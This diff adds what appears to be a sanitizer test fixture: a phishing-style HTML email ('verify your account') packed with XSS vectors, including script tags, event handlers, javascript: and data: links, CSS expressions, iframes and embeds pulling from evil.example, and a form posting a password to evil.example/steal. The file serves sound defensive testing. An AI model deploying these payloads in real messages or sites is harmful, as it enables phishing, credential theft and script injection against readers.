@@ -1,0 +1,24 @@
+From: Anna Smirnova <anna@example.org>
+To: Alice <alice@vinette.test>
+Date: Fri, 02 Oct 2026 14:32:00 +0300
+Message-ID: <m10@example.org>
+MIME-Version: 1.0
+Subject: Urgent: verify your account
+Content-Type: text/html; charset=utf-8
+
+<html><head><meta http-equiv="refresh" content="0;url=http://evil.example/"><style>@import url(http://evil.example/x.css);body{background:url(javascript:alert(1))}</style>
+<base href="http://evil.example/"></head><body onload="alert('onload')">
+<p>Visible text: safe-marker</p>
+<script>alert('script')</script>
+<img src="x" onerror="alert('onerror')">
+<a href="javascript:alert('js-link')">click me</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">data link</a>
+<iframe src="http://evil.example/frame"></iframe>
+<object data="http://evil.example/flash.swf"></object><embed src="http://evil.example/e.swf">
+<form action="http://evil.example/steal" method="post"><input name="password" type="password"><button>Send</button></form>
+<svg onload="alert('svg')"><script>alert('svg-script')</script></svg>
+<div style="width:expression(alert('css'));background:url(http://evil.example/bg.png)">styled</div>
+<a href="http://example.org/ok" target="_blank">safe link</a>
+<math><mi xlink:href="javascript:alert(1)">x</mi></math>
+<!--[if gte mso 9]><script>alert('conditional')</script><![endif]-->
+</body></html>
